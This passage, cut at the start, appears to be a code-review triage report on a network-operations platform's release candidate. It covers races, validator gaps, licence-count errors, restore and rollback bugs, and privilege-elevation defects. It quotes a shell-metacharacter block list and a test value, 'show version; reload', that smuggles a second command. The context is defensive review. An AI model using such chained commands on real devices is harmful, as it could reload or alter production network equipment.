(st DeviceState)` and drop the inner `st :=` to a plain assignment — which is exactly the shape collectOneGuarded already uses (`(st DeviceState)` at fanout.go:355). Then assert it: in fanout_test.go, with the injected clock, require every returned DeviceState to have a non-zero FinishedAt that is >= StartedAt, across the OK, partial, timed-out, unsupported and panic paths.

evidence: Write(): `if rw.line.Len() >= maxRedactLineBytes { if err := rw.emit(rw.line.String(), false); ...` (redactstream.go:93-97) and writeLine(): `if rw.started { if err := rw.raw([]byte{'\n'}); ... }` (redactstream.go:157-160) — a partial flush is emitted through the same separator path a complete line uses, so a >64 KiB logical line reaches the spill file split by newlines the device never printed. Nothing in redactstream_test.go exercises a line past the bound (the tests cover chunked PEM, post-Close, trailing partial line), so the header's byte-identity claim is only asserted on the package corpus. Unchanged since the review: `git diff --stat d796bf7d..9d981e5e -- src/backend/internal/protocoldiag` touches only fanout.go/fanout_test.go (9b7d12ca).
rationale: Real divergence, but the failure path is unreachable on the output this code actually sees. The bound's own comment states the intent: `It is deliberately larger than any real CLI line (the longest thing a router prints on one line is a route-target list or a base64 certificate blob) so the degradation never happens on real output` (redactstream.go:38-42), and the only production caller is tac/collect.go:518, streaming line-oriented device CLI output into a TAC bundle. Redaction correctness is untouched — the rules run over each piece before it is emitted, and the PEM state machine is deliberately not entered on a partial flush — so no secret escapes; what changes is line fidelity in a bundle, on a >64 KiB single line no vendor CLI emits. Not rc1-blocking: no data loss (every byte is kept), no silent failure, no security consequence; only cosmetic fidelity of a pathological case.
suggested_fix: Carry a `midLine bool` set by a partial flush and cleared by a complete one; writeLine skips the separator when the previous emit was a partial flush of the same logical line. Separately narrow the file header's byte-identity sentence to say it holds for lines within maxRedactLineBytes.

evidence: `func (f *Filter) cancelPendingLocked() { if f.pending != nil { f.pending.Stop(); f.pending = nil } }` — Stop()'s bool is discarded, and the timer's callback is `f.Disarm` (`f.pending = f.afterFunc(w, f.Disarm)`, :145), which re-takes f.mu. A timer that has ALREADY fired is blocked on f.mu while Arm holds it; when Arm releases, that stale Disarm runs and clears the needle/until the new Arm just installed. There is no generation counter anywhere in the file to make the callback a no-op. Nothing in d796bf7d..9d981e5e touches internal/parsetrace.
rationale: The race is real and the code has no guard against it, but through the shipped path it is theoretical. The only production arm site is pipedebug.HandleParseMarker (internal/pipedebug/parser.go:161-162): `window := ClampWindow(time.Duration(req.ForSeconds) * time.Second)` — the smallest window an operator can request is 1 s, and 0/negative becomes DefaultWindow (5 min), so the reproduction's 1 ns window is not reachable from the API. Collision requires a re-arm to land inside the few nanoseconds Arm holds the mutex at exactly the previous window's expiry, on a human-driven admin endpoint. The blast radius is one operator's parser decision trace being off; Active() then reports armed=false honestly (`if !f.until.IsZero() && f.now().After(f.until)` and the empty-needle check, :168-176), the operator sees it on the next GET, and re-arming fixes it. No telemetry, tenant data, credential or persisted state is involved, so it is not rc1-blocking.
suggested_fix: Give Filter an int generation counter; Arm increments it and captures the value in the closure (`gen := f.gen; f.pending = f.afterFunc(w, func(){ f.disarmGen(gen) })`), and the callback returns without touching state when f.gen != gen.

evidence: validateVendorDetection: `if d.OSVersionPattern != "" { if _, err := regexp.Compile(d.OSVersionPattern); err != nil { ... } }` — compile only, no NumSubexp check. ResolveOS then does `if m := osp.versionRe.FindStringSubmatch(d); m != nil { version = strings.TrimRight(m[1], ".,;:-") }` (registry.go:661-664): a groupless pattern that matches returns a 1-element slice and m[1] panics. The load-time round-trip check has the same shape (`m := osp.versionRe.FindStringSubmatch(rendered); if m == nil || strings.TrimRight(m[1], ...)`), so it would panic at boot instead for any vendor whose profiles declare an os_version_probe. The same file already enforces the guard twice for sibling fields: `if re.NumSubexp() < 1 { return fmt.Errorf("... has no capture group — there is nothing to read out of it") }` for os_version_probe patterns and for identity_probe serial/model patterns.
rationale: Confirmed as a validator gap: the check the file applies to every other authored regexp is missing on this one, and the consumer indexes group 1 unconditionally. It is worth the one-line fix for consistency, but it is not RC1-blocking. Nothing at runtime can introduce a pattern — Load is called in production only as `Load(profilesFS, "profiles")` (load.go:62) over the embedded, review-gated set — and all nine non-empty shipped patterns compile with exactly one group (verified by compiling every profiles/*.json os_version_pattern: arista, cisco, fortinet, huawei, juniper, linux, mikrotik, net-snmp, nokia, paloalto → 1 group each). So no crash is reachable at 9d981e5e; the defect is latent against a future profile edit.
suggested_fix: In validateVendorDetection, after the compile, `if re.NumSubexp() < 1 { return fmt.Errorf("vendorprofile: %s: os_version_pattern has no capture group — there is nothing to read out of it", name) }`, mirroring the os_version_probe/identity_probe checks.

evidence: Dialect side: `for _, d := range doc.ConfigCapture.PlatformDialects { if _, dup := r.configCap[d.ID]; dup { return nil, fmt.Errorf("vendorprofile: config_capture dialect id %q collides with an existing capture family", d.ID) } ... }`. Vendor side, a few lines above: `r.configCap[doc.Vendor] = cc` — no reverse check against an id a previously-loaded document already registered as a dialect. Documents are walked in sorted glob order (fs.Glob in Load), so the collision is silent in exactly one direction. The union is real too: `r.configVol[family] = append(r.configVol[family], compiledVolatile{...})` (registry.go:1022) appends, and `if _, participates := r.configCap[doc.Vendor]; participates { r.configFamilies = append(r.configFamilies, doc.Vendor) }` (registry.go:227-229) would list the id twice in ConfigCaptureFamilies.
rationale: The asymmetry is exactly as filed and would silently swap a family's running_config_cmd and union two vendors' volatile-masking rules — a wrong capture command and wrong redaction for that family. Not RC1-blocking because it cannot occur with the shipped data: the only dialect declared anywhere is nokia.json's `srlinux` (checked across all 20 profiles/*.json), and no vendor document uses that id, so the second-loader case has nothing to collide with today. It needs a future data commit (e.g. adding a standalone srlinux.json) to become live — which is precisely why the guard should be symmetric rather than left to review.
suggested_fix: Before `r.configCap[doc.Vendor] = cc`, reject when the key is already present (and record which ids came from dialects), so the collision errors out whichever document loads second — the same loud failure the dialect branch already produces.

evidence: Both halves of the claim check out. validateCaptureCommand — the one that enforces `if !ok { return ... %q is not a read-only show/display command }` plus `for i := 0; i < len(cmd); i++ { if b := cmd[i]; b < 0x20 || b == 0x7f { ... contains a control character } }` (load.go:545-573) — has exactly two call sites, load.go:492 (config_capture.running_config_cmd) and load.go:521 (platform_dialects[].running_config_cmd). validateIdentityProbe applies only `for _, bad := range configCaptureForbiddenBytes` (`{";", "&", "`", "$", "\\", "\n", "\r", ">", "<"}`). validateProfile validates Capture.PromptRegex, pcap capture and pcap family but never Capture.ShowVersionCmd. COUNTERWEIGHT: internal/osprobe re-checks every command immediately before it is put on a wire — `if err := s.checkCommand(command); err != nil { return "", err }` inside the single `run` closure (sources.go:282) that BOTH the show-version command and every identity_probe command go through (sources.go:295-305, readIdentity :330-340), against the identical byte list `commandForbiddenBytes` (sources.go:227). TestSSHRungRefusesACommandWithChainingMetacharacters proves the gate with `ShowVersionCmd: "show version; reload"` and asserts the command never reached the gateway.
rationale: The validator asymmetry is real, but the exploitable consequence is not reachable: profiles are compiled-in data (production builds the registry only via `Load(profilesFS, "profiles")`, load.go:62), there is no operator-loadable profile directory yet, and the runtime second gate already refuses chaining, redirection and CR/LF on both command families before they reach the SSH gateway. What is genuinely missing is a read-only-verb requirement and the full <0x20/0x7f sweep on the show-version and identity commands — defence-in-depth against an authoring mistake or a malicious commit, both of which are already code-review gated. That makes it real, cheap, and theoretical-only: hardening, not an RC1 defect. Not rc1_blocking — no untrusted input reaches this path and no privilege boundary is crossed without a source commit.
suggested_fix: Call validateCaptureCommand(where, "capture.show_version_cmd", p.Capture.ShowVersionCmd) from validateProfile, and run the same helper over each identity_probe command instead of the bare forbidden-byte loop, so all three command families that reach a live device are held to one contract.

evidence: pollOnce asks the ceiling per RAW cache id: `_, already := a.cache[d.ID]; if (!already || a.withheld[d.ID] != "") && a.wouldMonitorLocked(d) { if a.admitMonitoringLocked(d, monCount) { monCount++ } }`. But the number it is asked against is the DEDUPED one: monitoredCountLocked → monitorViewLocked, whose doc says `It works on the DEDUPED projection, because the deduped record is the device: two rows that share an identity token (a NetBox entry and the SNMP scan that found the same box) are one physical device and must consume one entitlement, never two`. So when a second source first reports an already-monitored physical device it arrives under a new raw id (netbox-… vs snmp-…), is not in the cache, is not skipped by the `existing.Source != src.Name()` precedence check (different key), and the gate is asked with a count that ALREADY includes that device. At a full hard ceiling the gate refuses and admitMonitoringLocked writes `a.withheld[d.ID] = reason`; monitorViewLocked then folds withheld by GROUP — `if why := a.withheld[rawID]; why != "" { g.withheld = why }` … `if on && g.withheld != "" { on, reason = false, g.withheld }` — so the whole canonical device flips to NOT monitored with reason "the licence ceiling is full". The gate is wired unconditionally in shipped builds: main.go:1124 `srv.discovery.SetMonitorGate(func(current int) error { return entitlement.CheckCeiling(srv.entitlements, entitlement.CeilingDevices, current) })`. Nothing in d796bf7d..9d981e5e touches internal/discovery.
rationale: Raised low→medium because the outcome is not a mis-count, it is COLLECTION STOPPING on a device the customer is licensed for and already paying for, with a false licence reason shown on the Licence page and in the withheld metric. Self-limiting but not harmless: the next poll re-asks with the now-decremented count and re-admits, so the device is dark for up to one poll interval (60 s default, per-source), and any genuinely new device can take the freed slot in the interim and extend it. Preconditions are ordinary, not exotic: a hard Community ceiling that is exactly full plus one device seen by two sources — which is the documented dedupe case (NetBox record + SNMP scan of the same box). rc1_blocking: licence-enforcement correctness, customer-visible correctness, and a real telemetry gap on a monitored device.
suggested_fix: Ask the ceiling against the CANONICAL device: resolve d.ID through the owners map from monitorViewLocked (as SetMonitoring already does at monitoring.go:229-234) and skip the gate when the canonical device is already monitored; key a.withheld by the canonical id too, so a refusal can never mark a group that holds an admitted row.

evidence: enrichVendors writes the version leaf with no provenance: `if descr != "" && d.OSVersion != TruncateDescr(descr) { d.OSVersion = TruncateDescr(descr); changed = true }` — OSVersionSource and OSVersionAt are never set. osProbeCandidatesLocked then builds `cur := osprobe.Current{Version: d.OSVersion, Source: osprobe.Method(d.OSVersionSource), ...}` and osprobe.Plan is `if strings.TrimSpace(cur.Version) == "" { return LadderOrder }; if cur.Source.automatic() { return []Method{cur.Source} }; return nil` — Method("") is not in LadderOrder so automatic() is false (osprobe.go:186-193) and Plan returns nil. Accept agrees: `if strings.TrimSpace(cur.Version) == "" { return true }; return cur.Source == r.Method` — with Source "" no rung's reading is ever accepted. rationale: The premise is exactly right and the chain is complete at 9d981e5e. `Usage` is documented as a map where an ABSENT key means NOT MEASURED (state.go: "A ceiling absent from the map is NOT MEASURED and is omitted from the result rather than reported as zero"), and `State.Overages` implements that by `cur, measured := u[name]; if !measured { continue }`. `Observe` then collapses the two cases: it builds `live` only from the returned overages and unconditionally `delete(t.recs, name); t.dirty = true` for anything not live, then `flushLocked()` writes the truncated register to disk. So "could not measure" is persisted as "the episode ended". `licenceUsage` is precisely the producer of the absent key: `if n, err := s.watchedPrefixCount(ctx, TenantGlobal, true); err == nil { u[...] = n }` with the comment "On error the key is simply absent". `watchedPrefixCount` -> `bgpWatch.List` -> `WithTenant`/`pool.Begin` -> a live Postgres read, so a PG hiccup OR a cancelled scrape context is enough. Interaction worth flagging: finding 3.6-04 is the cheapest trigger — a scraper that hits its own scrape timeout closes the connection, `r.Context()` is cancelled, the pgx call returns an error, the key vanishes, and one slow scrape durably erases `overage_since` and `Peak` and restarts the episode at `now` on the next successful scrape. Both the /metrics path and the Licence page read path (Service.Overages) run the same writer. `since` is the one fact the file's own header says cannot be recovered ("a process that only ever sees now cannot recover it after a restart"), and it feeds a true-up billing conversation, so this is durable loss of a commercial record plus a customer-visible wrong start time on the Licence page. rc1_blocking: data loss / state corruption / customer-visible correctness. Note the devices ceiling is immune (MonitoredCount cannot fail), so the exposure is specifically watched_prefixes.

rationale: The race is real as described — the count and the create are separate statements with no lock between them and the `Repo` interface has no ceiling/entitlement parameter at all, so two goroutines that both read countRealTenants()==0 will both proceed to Create. But the value of fixing it in isolation is low and the failure path is theoretical: (a) the actor must be a platform admin, i.e. the licensee themselves, not an outside party; (b) two creates must be genuinely in flight across the 0->1 boundary; (c) the overshoot is bounded by the concurrency (one or two extra tenants), not unbounded; (d) no isolation, authentication, authorization, privilege or data boundary is crossed — the tenants ceiling is itself documented as unenforced ("carried in the licence but not enforced by this build", main.go:6094), so this gate is a commercial funnel, not a safety control. Most importantly it is strictly dominated by 3.6-02: while /api/onboard creates orgs and tenants with NO check at all, a serialized check on /api/tenants closes nothing. It is a defect, and I would fix it as part of the 3.6-02 change (one gate helper, taken under the same lock the store already needs), not as its own work item. Not rc1_blocking on its own.

rationale: Reproduces, and it is a defect against the handler's OWN stated invariant rather than a style preference. Every other block in this handler documents that it must not block on a store — the snapshot block says verbatim "the metrics handler never makes a blocking OpenSearch call", and the metering block says "rendered from atomics the hourly recorder already updated, so the scrape never blocks on a store". `licenceUsage` is the single exception: it makes a live Postgres round trip (`WithTenant` -> pool acquire -> `tx.Query`) with no timeout of its own, bounded only by `r.Context()`. Two consequences. (1) Everything written AFTER line 4356 — the metering families, IGP, BMP and `s.vmalertWebhookMetrics.Write(w)`, which carries `netops_alert_webhook_heartbeat_timestamp_seconds` — is lost for any scrape that stalls there. That heartbeat is documented in CLAUDE.md as "the only end-to-end proof that the delivery chain works" and its absence is one of the four `tier: page` conditions, so a database stall degrades the alerting-liveness layer that is supposed to be independent of everything else. (2) The cancellation that saves the handler is exactly what triggers 3.6-01: the scraper hangs up at its own scrape timeout, `r.Context()` is cancelled, `licenceUsage` drops the watched_prefixes key, and `Observe` durably erases `overage_since`. I am keeping the severity at low rather than raising it because client-disconnect cancellation does bound the stall (it is not the full 180 s `HTTP_WRITE_TIMEOUT`) and server-side statement/lock timeouts cap the query, so there is no unbounded pile-up. rc1_blocking is true on the silent-failure / monitoring-integrity ground and because this is the practical trigger for 3.6-01's data loss.
evidence: main.go:4356 — `s.entitlements.WriteUsageMetrics(w, s.licenceUsage(r.Context()), time.Now().UTC())`, sitting ABOVE `s.meteringRecorder.WriteMetrics(w)`, `s.igpAPI.Metrics().Write(w)`, `s.bmpAPI.Metrics().Write(w)` and `s.vmalertWebhookMetrics.Write(w)`. main.go:6698-6712 — `watchedPrefixCount` calls `s.bgpWatch.List(ctx, tenant, cross)` with the caller's ctx and no `context.WithTimeout`. bgp_ops.go:103-122 — `List` runs `s.db.WithTenant(ctx, tenant, cross, func(tx pgx.Tx) error { rows, err := tx.Query(ctx, ...) })`, i.e. a pool acquire plus a query on the scrape's context. Contrast main.go:4308-4310 ("the metrics handler never makes a blocking OpenSearch call") and main.go:4360-4363 ("so the scrape never blocks on a store"). main.go:1794-1796 — ReadTimeout 120 s / WriteTimeout 180 s are the only outer bounds.
suggested_fix: Two independent cheap changes: (1) give licenceUsage its own short `context.WithTimeout` (a couple of seconds) so a store stall cannot outlive a scrape budget; (2) move the LICENCE block below the vmalert-webhook / metering / engine-liveness writes so a licence-bookkeeping stall can never cost the alert-delivery heartbeat a sample. Better still, serve the watched-prefix count from a cached value refreshed by a worker, which is the pattern every other block in this handler already uses. Fixing 3.6-01 first is what actually removes the data-loss consequence.

rationale: Reproduces exactly, and it is worse than a moveto/lineto mix-up: the gap logic it was written for cannot work at all. Every appended segment ends with a trailing space, so `d.endsWith(" ")` is true on every iteration after the first, and the first is caught by `d === ""`. Every point therefore emits an `M`. A path made only of movetos with `fill="none"` draws nothing, so the Trend column of the recorded-usage table is permanently blank for every meter and every tenant. Separately, the null branch is `{ d += ""; return; }` — it appends nothing, so even a correct trailing-space test could not detect a gap; there is no state that records "the previous point was missing". Meanwhile the `<svg role="img">` advertises `aria-label={`${label} over the period, peak ${max}`}`, so a screen-reader user is told there is a trend with a peak of N while a sighted user sees an empty cell — the accessible name asserts content the element does not have. This is a shipped feature that renders nothing on a customer-facing page, not a styling nit, so I am marking it rc1_blocking under customer-visible correctness; it is the weakest of the five on that ground. Nothing in d796bf7d..9d981e5e touches Licence.tsx, and no test covers it — grep for `Trend`, `lic-spark` and `over the period` in src/frontend/src/pages/Licence.test.tsx returns nothing, so the suite never asserted the path.

"M" : "L"}${x.toFixed(1)},${y.toFixed(1)} `; });` — the template literal ends with a space, so the ternary is true every time. Add a unit test asserting the emitted `d` contains at least one `L` for a contiguous series and starts a fresh `M` after a null. While in there, drop the peak from the aria-label when no polyline is drawn, or move the peak into a visible caption so the accessible name matches what is rendered.

rationale: Reproduces at 9d981e5e (package untouched since the review). Put() takes the lock only for the in-memory swap and does the durable write after releasing it, so two concurrent Puts can commit memory in order A→B and disk in order B→A: RAM holds B, disk holds A, permanently and silently, until the next write or the next api restart (NewFileConfigStore reads the file, i.e. the STALE value, back into memory). On top of that every writer does an unsynchronised read-modify-write through Get()/config(), so a concurrent pair also loses one whole update. Three writers race here: the config PUT handler (http.go:110-124 reads prev := s.config() then putConfig(clean)), recordSnapshotScheduleIntent (policy.go:318-334), and recordSnapshotPolicyWrite (policy.go:378-380) — the last two are both fired by the snapshot-policy PUT, so a policy PUT racing a destination PUT from a second admin tab (or one operator double-submitting Save) is enough. The lost field can be SnapshotScheduleDisabledAt, which is by its own comment 'the ONE source of truth' the opensearch-init bootstrap reads to decide whether to re-enable the nightly snapshot — losing it re-enables a schedule a human deliberately stopped, which is precisely the GUI-says-off/cluster-says-on divergence this store was built to end. RC1-blocking as durable state corruption of a platform-global data-protection control; severity kept low because it needs concurrent platform-admin writes.
evidence: config.go:139-152 `func (s *FileConfigStore) Put(c Config) error { … s.mu.Lock(); s.cfg = c; s.mu.Unlock(); b, err := json.MarshalIndent(c, "", "  "); if err != nil { return err }; return platformdb.WriteFileAtomic(s.path, b, 0o600) }` — WriteFileAtomic is outside the critical section, so tmp+rename is atomic per write but the ORDER of two writes is not serialised against the memory order. config.go:118-123 NewFileConfigStore seeds s.cfg from the file, so the divergence survives a restart as the stale value winning. No compensating serialisation: the opsRing single slot (ops.go:140-145) covers create/restore/verify/delete only and is never taken by any config or policy PUT (grep for `.begin(` shows one call site, http.go:472, in handleSnapshotAction).
suggested_fix: Hold s.mu for the whole read-marshal-write in Put (a plain sync.Mutex, not RWMutex, for the write path), and give the store a Mutate(func(*Config)) that performs the read-modify-write under that same lock so the three callers stop doing Get-then-Put across an unlocked gap.

rationale: Reproduces at 9d981e5e. The cleanup defer is registered before the restore is attempted (deliberately — the comment says 'registered FIRST so an early return still cleans up'), and it treats every non-2xx from DELETE /probe-<idx> as a leak. On the commonest failure path — the restore call itself failing, which is exactly the 2026-08-26 blob-tree shape the probe exists to catch — the temp index was never created, OpenSearch answers 404, and the code reports a leaked index that does not exist, appends 'temp index probe-X could NOT be deleted: opensearch 404 Not Found' to a Detail that will then be persisted permanently by 3.8-01, and emits a spurious ERROR log. The package already knows how to do this correctly elsewhere (errors.As on *StatusError with Status == http.StatusNotFound in coverage.go:335-338 and config.go:420-423), so this is an oversight, not a design choice. Not rc1-blocking: it changes no state, cannot flip Verified (already false whenever runErr != nil), and its damage is a false ERROR line plus polluted verdict text — log/observability noise, explicitly outside the blocking list.

The 404 is an error because backend_client.go:197-204 returns `&dataprotect.StatusError{Status: resp.StatusCode, …}` for any status outside 200-299, and dataProtectSearch.Do (main.go:5827) is a straight pass-through to it. The restore that would have created the index is issued 30 lines LATER, at ops.go:664-670.
suggested_fix: In the defer, ignore a 404: `var se *StatusError; if errors.As(err, &se) && se.Status == http.StatusNotFound { res.TempDeleted = true; return }` — the same shape already used at coverage.go:336.

rationale: Reproduces at 9d981e5e, and it contradicts the package's own written concurrency policy rather than merely being untidy — which is what makes it a fix rather than a deferral. The scheduled probe performs a REAL restore against the repository and is the only such operation that does not pass through opsRing.begin, so it is invisible to GET /operations, does not 409 against an in-flight operator action, and does not stop one starting under it. The damage is bounded, though: probeIndexPrefix is "probe-" while restorePrefixRe forces any operator-chosen rename prefix to match ^restored-…$, so a scheduled probe can never delete an index an operator restored. The reachable collisions are (a) manual verify + scheduled probe on the same snapshot, which build the identical "probe-<idx>" name — one restore is refused because the index exists, or one deferred DELETE removes the other's index mid-count; (b) an operator delete of the snapshot being probed; (c) an in_place restore closing the live index whose doc count the probe is reading, giving a wrong SourceDocs. Each yields a wrong verdict, which 3.8-01 then freezes for a day. Not rc1-blocking on its own: no state corruption, no data loss, no cross-tenant reach (the surface is platform-admin only), and the harmful outcome is mediated entirely by 3.8-01. Severity kept low — it needs a manual action inside the same 10-minute tick.
evidence: ops.go:140-145 states the invariant: 'Concurrency policy: ONE slot. Create, restore, verify and delete all serialise through `running`. A second request while one is in flight is a 409 naming the operation that holds the slot … and never two restores racing over the same index namespace.' ops.go:861-865 `*lastProbe = s.now(); pctx, cancel := context.WithTimeout(ctx, snapshotVerifyTimeout); defer cancel(); res, probeErr := s.RunRestorabilityProbe(pctx, newest.Snapshot, func(string) {}); s.recordProbeVerdict(res, probeErr)` — no s.ops.begin/finish anywhere in ProbeTick or StartRestorabilityProbe. The only begin() call site in the package is http.go:472 (`op, conflict, ok := s.ops.begin(kind, caller.Subject, target)`), on the operator path, whose verify verb builds the same probe (http.go:463-467). Prefix isolation: ops.go:69 `DefaultRestorePrefix = "restored-"`, ops.go:73 `probeIndexPrefix = "probe-"`, ops.go:120 `restorePrefixRe = regexp.MustCompile(`^restored-[a-z0-9-]{0,24}$`)`.
suggested_fix: Have ProbeTick claim the slot the same way the operator path does — s.ops.begin(OpKindSnapshotVerify, "system:probe", target) with a deferred finish — and simply skip the tick (log at info) when begin returns a conflict, so the scheduled probe both serialises and shows up in GET /operations.

rationale: Reproduces, and I am raising it low→medium because the arithmetic makes it near-certain in production rather than theoretical. The 200-index cap is checked against req.Indices BEFORE the snapshot is even fetched; the in_place-with-no-list branch then materialises doc.Indices with no cap at all, and closeIndices/openIndices comma-join that list into the REQUEST LINE (`/idx1,idx2,…/_close`), not a body. OpenSearch's Netty default http.max_initial_line_length is 4kb and the compose stack does not raise it (no http.max_initial_line_length anywhere under deployment/docker/). The shipped ISM index families are netops-applogs-*, netops-platformlogs-*, netops-syslog-*, netops-flows-*, netops-snmptrap-*, netops-cloudlogs-*, netops-secfindings-*, netops-deadletter-*, security-auditlog-* — nine daily families; a name like netops-platformlogs-2026.09.08 is 30 chars, so ~131 indices exhausts 4kb, i.e. roughly fifteen days of retention. Whole-snapshot in_place restore is THE disaster-recovery action this surface exists to offer, and it stops working on any deployment older than a couple of weeks. It does fail safe on the state (the close request is rejected before any index is touched), but the error text asserts the opposite: reopenNote is called on the same oversized list, also fails on the initial line, and the operator is told 'the indices were left CLOSED and the automatic reopen also failed' when nothing was ever closed — an operator acting on that will start hand-opening indices that are already open, on a cluster they believe is down. RC1-blocking as customer-visible correctness of the restore path plus a false report of cluster state during a recovery.
evidence: ops.go:1174 `if len(req.Indices) > snapshotRestoreMaxIndices { return plan, http.StatusBadRequest, jsonError("at most 200 indices may be named in one restore") }` — req.Indices only, and it runs before findSnapshot. ops.go:1199-1203 `if plan.mode == RestoreModeInPlace && len(plan.indices) == 0 { plan.indices = append(plan.indices, doc.Indices...); sort.Strings(plan.indices) }` — no cap on the materialised set. ops.go:1264-1274 `func (s *Service) closeIndices(ctx context.Context, idx []string) error { … return s.osDo(ctx, http.MethodPost, "/"+strings.Join(idx, ",")+"/_close", nil, nil, 5*time.Minute) }` and openIndices identically. ops.go:1237-1239 `if err := s.closeIndices(ctx, p.indices); err != nil { return fmt.Errorf("close step failed: %w%s", err, s.reopenNote(ctx, p.indices)) }` with ops.go:1284-1287 `if err := s.openIndices(context.WithoutCancel(ctx), idx); err != nil { return " — the indices were left CLOSED and the automatic reopen also failed: " + err.Error() }`. Note the restore call itself is safe — payload["indices"] goes in the JSON body (ops.go:1215-1217) — so the break is specifically the close/open URL. Index families: deployment/docker/opensearch/apply-ism.sh:34.
suggested_fix: Apply snapshotRestoreMaxIndices to plan.indices AFTER materialisation (refusing with a message that tells the operator to name index batches), and batch closeIndices/openIndices into chunks that keep each request line well under 4kb — or move the index list off the URL. Separately, make reopenNote distinguish 'the close never happened, nothing is closed' from 'the close succeeded and the reopen failed' so the failure text cannot claim a state the cluster is not in.

rationale: Reproduces, with the count corrected: it is NINETEEN of the twenty-two rollbacks, not eleven, and the three that do it right are 0023_service_path_graph, 0024_business_service and 0024_cloud_connectors (the row named only 0023/0024, missing that there are two 0024s). All twenty-two files are new on this branch (`git diff --diff-filter=A main...HEAD`), so the row's framing of it as 'the repo's dominant existing convention' is backwards — there is no pre-existing rollback convention to inherit; the convention is the one 0023 itself writes down, and nineteen of its own siblings depart from it. The consequence is real: the migrator gates purely on the presence of the version row, so after an operator runs a rollback the next api start skips re-applying it, the api reports healthy, and every query against the dropped table or column fails at request time. There is no compensating boot-time schema check (the only information_schema probe in platformdb is rows.go:699, for netops_kv alone) and no test guarding the convention. RC1-blocking under 'upgrade or release correctness' — a documented operator procedure leaves the schema silently broken across the next upgrade. Severity kept low: it requires a deliberate manual rollback, the failure is loud once traffic hits the table, and the fix is one SQL line per file.
evidence: Migrator, db.go:283-290: `if err := conn.QueryRow(ctx, `SELECT EXISTS(SELECT 1 FROM schema_migrations WHERE version=$1)`, f).Scan(&done); err != nil { return err }; if done { continue }` — presence of the row is the only test; nothing verifies the objects exist. The stated convention, 0023_service_path_graph.down.sql header: 'After it completes, delete the migration's row so a later re-apply is possible: DELETE FROM schema_migrations WHERE version = '0023_service_path_graph.sql'; (included below)' — and the file ends with exactly that statement. Grep of all 22: HAS the DELETE → 0023_service_path_graph, 0024_business_service, 0024_cloud_connectors. MISSING → 0026_business_service_owner, 0027_incident_time_metrics_rollup_source, 0028_business_service_runbook, 0030_wireless_inventory, 0031_maintenance_windows, 0032_pipeline_processors, 0033_pipeline_processor_framework, 0034_processor_type_check, 0036_rca_feedback, 0037_security_control_plane, 0038_config_backup, 0039_packet_capture, 0040_iris_investigations, 0041_bgp_alert_policy, 0042_security_framework_state, 0043_dem_targets, 0044_dem_experience, 0045_tac_templates, 0046_metering_daily. The ALTER-based ones (0026/0027/0028/0034) have the same defect in column form — the dropped column never comes back.
suggested_fix: Append `DELETE FROM schema_migrations WHERE version = '<NNNN_name>.sql';` to each of the nineteen, and add a cheap guard test that asserts every migrations/rollback/*.down.sql contains a DELETE FROM schema_migrations naming its own forward file, so the next rollback added cannot drift.

rationale: Reproduces verbatim at HEAD. `tenantIdPBody` (oidc_config.go:1085-1098) has no `kind` and no `elevation` field, and the record built at :1250-1256 lists every field it copies — Kind/Elevation are absent. `Store.Set` (internal/ssoidp/ssoidp.go:452-479) is a FULL replace (`next[idx] = in`); the only field it carries forward from the stored record is ClientSecret (:470-472). `Normalize()` (:165-168) then turns the blank Kind into `KindStanding`. So any tenant-admin PUT on a tenant-bound elevation connection rewrites it to a standing one, and every subsequent sign-in takes the UpsertFederatedInRealm/provisioning path in oidc.go instead of `completeElevationSSO`, granting a permanent role instead of a time-bound binding. Nothing in the response (`tenantIdPView`), the audit detail (`sso.tenant_idp.save` records only idp/protocol/enabled/tenant_id, :1274) or the log line (:1277) mentions the access model. This is not theoretical on the client side either: the SPA's `SsoIdP` type carries `kind`/`elevation` (services/api.ts:8570-8574) and `saveTenantSsoIdp` PUTs the whole object — the server drops them. Also means a tenant admin can never create or keep an elevation door on this surface at all. Held at medium rather than raised: the blast radius is confined to the editing tenant's own realm (1dad6a16's realm constraint still bounds which accounts the connection can reach) and the tenant admin already holds administration:admin there — what is lost is the time-bound guarantee, silently. rc1_blocking because it is a privilege-boundary/access-model change made silently by a routine edit.
evidence: oidc_config.go:1250 `cfg := ssoidp.Config{Alias: alias, DisplayName: in.DisplayName, Protocol: in.Protocol, Enabled: in.Enabled, ... TenantID: tenantID}` — no Kind, no Elevation; ssoidp.go:476 `next[idx] = in`; ssoidp.go:166 `if c.Kind == "" { c.Kind = KindStanding }`. `git log d796bf7d..9d981e5e -- src/backend/oidc_config.go` returns only 1dad6a16, which does not touch this path.
suggested_fix: Preserve the stored record's Kind/Elevation across a tenant PUT (read the existing record and carry those two fields), or refuse the PUT with an explicit error when the stored record is an elevation connection and the body cannot express it. Whichever way, put the access model in the audit detail and the response.

rationale: Reproduces at HEAD (file untouched since the review). `onClick={() => { api.endElevation().catch(() => {}).finally(() => { setState(null); onStepDown?.(); }); }}` — the rejection is swallowed and the success actions run unconditionally. The server side is real, not hypothetical: handleElevation's DELETE branch (breakglass.go:589-602) can answer 500 when `s.bindings.Remove(b.ID)` fails (PG/file store unavailable), and only reaches `auditElevation(r, "ELEVATION_REVOKED", ...)` on success — so on failure the grant is live AND no revocation is recorded, exactly as filed. Lowered from medium to low because the deception is bounded: `onStepDown` closes the account menu, which unmounts the row, and the next time the menu is opened the 30 s `api.elevation()` poll re-renders the still-active grant with its countdown. Still rc1_blocking: it is a silent failure on a privilege-revocation action, and the window in which an operator believes they stepped down is exactly the window in which they act as if they had.
evidence: IconRail.tsx:79 `onClick={() => { api.endElevation().catch(() => {}).finally(() => { setState(null); onStepDown?.(); }); }}`; breakglass.go:595-601 `if err := s.bindings.Remove(b.ID); err != nil { writeError(w, http.StatusInternalServerError, err); return } ... s.auditElevation(r, "ELEVATION_REVOKED", ...)`.
suggested_fix: Only clear the row and close the menu on success; on rejection keep the row, surface the error text in place ("elevated access is still active — try again"), and re-poll.

